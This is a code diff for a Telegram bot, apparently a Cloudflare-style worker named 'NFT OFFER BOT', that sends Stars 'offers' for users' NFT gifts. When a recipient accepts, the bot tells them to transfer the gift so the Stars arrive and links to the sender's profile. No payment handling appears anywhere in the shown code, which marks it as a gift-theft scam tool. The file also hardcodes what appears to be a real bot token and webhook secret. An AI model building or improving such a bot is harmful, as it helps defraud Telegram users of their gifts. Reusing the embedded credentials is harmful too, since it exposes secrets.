@@ -1,8 +1,14 @@
 const ADMIN_ID = 5151757168; 
 const BOT_TOKEN = "9231998177:AAGBygPUUaRla7FJujix4bE9cpYWcg4U3w0"; // ВСТАВЬ СВОЙ ТОКЕН
-const WEBHOOK_SECRET = "GarisOffer9231998"; // ВСТАВЬ СВОЙ СЕКРЕТ
+const WEBHOOK_SECRET = "GarisOffer9231998"; // ТВОЙ СЕКРЕТ
 
-const ALLOWED_IDS = [5151757168,9021098137, 1290278554,883619484];
+// ТУТ УЖЕ ВПИСАНЫ ВСЕ ТВОИ ID
+const ALLOWED_IDS = [
+  5151757168, 
+  9021098137, 
+  1290278554, 
+  883619484
+];
 const ALLOWED_USERNAMES = ["nogannopervi"];
 
 export default {
@@ -30,7 +36,6 @@ export default {
         if (!isAdmin && !isAllowed) {
           text = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу: @gwrex\nВаш ID: <code>${userId}</code>`;
         } else {
-          // ТУТ ВЕРНУЛ ВЛАДЕЛЬЦА @gwrex
           text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n👑 <b>Владелец:</b> @gwrex\n\nЧтобы отправить оффер, напишите:\n<code>@GarisOfferBot t.me/nft/LolPop-348029 450 stars</code>`;
         }
         await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
@@ -48,18 +53,24 @@ export default {
         if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });
 
         const textQuery = iq.query.trim();
+        
+        // Ищем сумму (последнее число)
         const allNums = textQuery.match(/\d+/g); 
         const amount = allNums ? allNums[allNums.length - 1] : "0"; 
         
-        const giftMatch = textQuery.match(/(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/); 
-        const giftId = giftMatch ? giftMatch[0] : "";
+        // ИСПРАВЛЕНИЕ: Ищем ссылку/название подарка, даже если есть https://
+        const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
         
         let giftLink = "";
-        if (giftId) {
-            if (giftId.startsWith("t.me")) {
-                giftLink = "https://" + giftId;
+        if (giftMatch) {
+            let rawGift = giftMatch[0];
+            // Убираем протокол https://, если он есть
+            rawGift = rawGift.replace(/^https?:\/\//, '');
+            
+            if (rawGift.startsWith("t.me")) {
+                giftLink = "https://" + rawGift;
             } else {
-                giftLink = "https://t.me/nft/" + giftId;
+                giftLink = "https://t.me/nft/" + rawGift;
             }
         }
 
@@ -90,7 +101,6 @@ export default {
       if (update.callback_query) {
         const cq = update.callback_query;
         
-        // ИСПОЛЬЗУЕМ startsWith, чтобы реагировал и на старые кнопки (acc_123) и на новые (acc)
         if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
             
           const buyer = cq.from;
@@ -98,14 +108,12 @@ export default {
           if (buyer.last_name) buyerName += " " + buyer.last_name;
           if (!buyerName) buyerName = buyer.username ? "@" + buyer.username : "Пользователь";
 
-          // Ссылка на профиль. Если нет @username, ведем на твой профиль
           let buyerLink = buyer.username ? "https://t.me/" + buyer.username : "https://t.me/gwrex";
 
           let newText = "";
           let newMarkup = { inline_keyboard: [] };
 
           if (cq.data.startsWith("acc")) {
-            // 1. Показываем окошко (мгновенно)
             await callApi("answerCallbackQuery", { 
               callback_query_id: cq.id, 
               text: "Предложение успешно принято ✅\n\nПередайте подарок, чтобы ⭐️ Stars пришли", 
@@ -117,38 +125,42 @@ export default {
               inline_keyboard: [[{ text: "🎁 Передать подарок", url: buyerLink }]] 
             };
           } else {
-            // 1. Убираем загрузку (без окошка)
             await callApi("answerCallbackQuery", { callback_query_id: cq.id });
-            
             newText = `❌ <b>Вы отказались от оффера.</b>`;
           }
 
-          const chatId = cq.message.chat.id;
-          const messageId = cq.message.message_id;
-
-          // 2. ПЫТАЕМСЯ ОТПРАВИТЬ НОВОЕ СООБЩЕНИЕ
-          try {
-            await callApi("sendMessage", { 
-              chat_id: chatId, 
-              text: newText, 
-              parse_mode: "HTML",
-              reply_markup: newMarkup
-            });
-
-            // 3. ЕСЛИ ОТПРАВИЛОСЬ - УДАЛЯЕМ СТАРОЕ
+          // Обработка инлайн-сообщений (редактируем на месте)
+          if (cq.inline_message_id) {
             try {
-              await callApi("deleteMessage", { chat_id: chatId, message_id: messageId });
-            } catch (delErr) {
-              console.log("Не удалось удалить старое сообщение (возможно, оно слишком старое)");
+              if (cq.message && cq.message.caption !== undefined) {
+                await callApi("editMessageCaption", { 
+                  inline_message_id: cq.inline_message_id, 
+                  caption: newText, 
+                  parse_mode: "HTML", 
+                  reply_markup: newMarkup 
+                });
+              } else {
+                await callApi("editMessageText", { 
+                  inline_message_id: cq.inline_message_id, 
+                  text: newText, 
+                  parse_mode: "HTML", 
+                  reply_markup: newMarkup 
+                });
+              }
+            } catch (err) {
+              console.error("Ошибка при редактировании:", err.message);
             }
-
-          } catch (sendError) {
-            // ЕСЛИ ОШИБКА - ПОКАЗЫВАЕМ ЕЕ В ОКОШКЕ, ЧТОБЫ МЫ ЗНАЛИ ПРИЧИНУ
-            await callApi("answerCallbackQuery", { 
-              callback_query_id: cq.id, 
-              text: "Ошибка при отправке: " + sendError.message, 
-              show_alert: true 
-            });
+          } 
+          // Обработка обычных сообщений
+          else if (cq.message) {
+            const chatId = cq.message.chat.id;
+            const messageId = cq.message.message_id;
+            try {
+              await callApi("sendMessage", { chat_id: chatId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
+              try { await callApi("deleteMessage", { chat_id: chatId, message_id: messageId }); } catch (e) {}
+            } catch (err) {
+               console.error("Ошибка отправки:", err.message);
+            }
           }
         }
       }
